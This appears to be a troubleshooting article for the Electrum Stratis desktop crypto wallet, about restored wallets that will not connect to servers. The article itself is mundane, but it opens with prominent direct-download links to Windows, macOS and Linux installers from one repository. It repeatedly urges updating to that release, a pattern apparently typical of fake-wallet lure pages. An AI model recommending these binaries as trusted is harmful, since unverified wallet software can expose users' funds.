![Electrum-Stratis](assets/banner-article.png)

# Restored from seed and still not connected: what the restore did and did not fix

<p align="center">A restore is not a connection</p>

<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ffffff"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"> | Windows 10 (1909) or later, 64-bit | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ffffff"> | macOS 12 or later | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ffffff"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |

</div>

All versions, installers and checksums are on the [Electrum-Stratis v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

> Only download from this GitHub release page.

A seed restore rebuilds keys and addresses; it does not rebuild a network connection. If the wallet shows the right addresses but stays offline, the restore succeeded and the peer connection failed - two separate systems that happen to fail at the same moment. Fix the connection first, then judge the balance. Electrum Stratis is a self-custody desktop wallet for the legacy Stratis chain, and the restore flow previews addresses before committing so the two questions can be kept apart.

## You'll see this if

<div align="center">

| What you see after restoring | What it means | Next step |
|---|---|---|
| Addresses match, height frozen | Restore worked, connection did not | Peer diagnosis |
| Addresses match, "Not Connected" | Same, stated plainly | Server probe |
| Addresses differ from the old wallet | Wrong seed, wrong chain or wrong type | Address preview check |
| Connected, empty history | Syncing, or the wrong wallet | Wait for height, then re-check |
| Connected with a balance, sending fails | Signing step, not the network | Password and inputs |

</div>

The distinction is worth stating in one line: a restore answers "which keys?", a connection answers "what does the chain look like?" Neither substitutes for the other.

## Why it happens

Restoring writes a new wallet file, derives the addresses and hands them to the same network layer every other wallet uses. That layer has its own failure modes - a server that does not answer, a network that blocks the handshake, an SSL setting that no longer matches the server's - and none of them is affected by how the wallet's keys were produced.

An older build adds a second dimension. A client from an earlier era may speak a protocol a current server no longer accepts, which looks exactly like a dead network. That is why the first recommendation after any restore problem is to run the current release rather than to keep probing an old binary.

The health panel in the maintained build, current release on the [release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19), separates "no peer" from "stale peer" - the difference between a network fault and a server answering with old data.

## Fix

1. **Read the health panel.** It names the server, its latency, the height and the age of the last block. A frozen height with no server is a connection fault; a fresh-looking connection with an old height is a stale peer.
2. **Probe the server list.** Open the node list, probe the entries, and watch which answers. Move a responding server to the top, or add one that responds.
3. **Check the SSL setting deliberately.** If the connection only forms with SSL off, the server or the network path is at fault; prefer a different server over a permanent downgrade.
4. **Confirm the addresses before chasing the network.** If the restore produced the addresses you expected, the keys are right and the remaining problem is connectivity. If they are not, stop: the seed or the wallet type is wrong, and no server will fix that.
5. **Update to the current release if the build is old.** A protocol mismatch produces the same symptom as a dead network, and replacing the binary is faster than proving which one it is.

Once the height reaches the chain tip, the history fills in on its own - and if it does not, the problem has changed from connectivity to [an Electrum Stratis balance that is missing](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/main/balance-is-missing.md). A restored wallet with a current height and a missing balance is a different problem, and it has its own diagnosis.

## If that did not work

If no server answers on any network, the problem is local: a firewall, a TLS-inspecting antivirus, a VPN or a proxy. The diagnostics export records the handshake failures, which is the artifact that turns a guess into a report.

If one server answers and the height still lags, the peer is reachable and behind. Switch to one with a recent last block; a stale peer looks connected and behaves like no connection at all.

If the wallet connects, syncs, and shows an empty wallet at addresses you do not recognise, the restore used the wrong input. Check the phrase, the chain and the wallet type before doing anything else - and do not send funds to an address you do not recognise as yours.

## Prevention

- Update to the current release before troubleshooting a restore.
- Keep two or three servers you have probed successfully.
- Compare an address after every restore, before trusting the balance.
- Test the same machine on another network when nothing connects.
- Keep the diagnostics export from a working session for comparison.

## FAQ

### I have the current build and cannot connect after restoring from seed. What now?

Treat it as a peer problem: check the health panel, probe the server list, add a responding server, and test another network if none answer. The restore succeeded if the address preview matched, so the remaining fault is between the application and a server.

### Stratis Electrum Wallet now cannot be connected - is my wallet broken?

Unlikely. A wallet that cannot connect is blind rather than broken: the keys and the coins are unaffected, and the balance appears once a peer answers. Broken wallets fail at the key or file level, which looks different - wrong addresses or a file that will not open.

### Why did it work before the restore and not after?

Because the two events are unrelated. A restore changes the wallet file; a connection failure changes the network path or the server. The coincidence makes the restore look responsible, which is why separating the two checks saves time.

### Does a new wallet need a different server?

No. All wallets on the same chain use the same kind of server; the list is shared. A restored wallet does not inherit a different network configuration unless you changed it.

<!-- DOWNLOAD-BLOCK -->

Before changing settings, separate the machine from the wallet. Does anything else on this computer reach the internet? Is a VPN, proxy or firewall in the path? Is the system clock correct, since a large skew breaks TLS handshakes and produces a failure that looks like a dead server. A wallet that fails every server is usually a network problem wearing a wallet's clothes.

## Related articles

- [Why "Not Connected" happens](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/main/wallet-says-not-connected.md)
- [The server list and the cloud node](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/main/the-server-list-explained.md)
- [The Use SSL toggle](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/main/the-use-ssl-toggle.md)
- [Is the seed enough to restore the wallet?](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/is-the-seed-enough-to-restore.md)
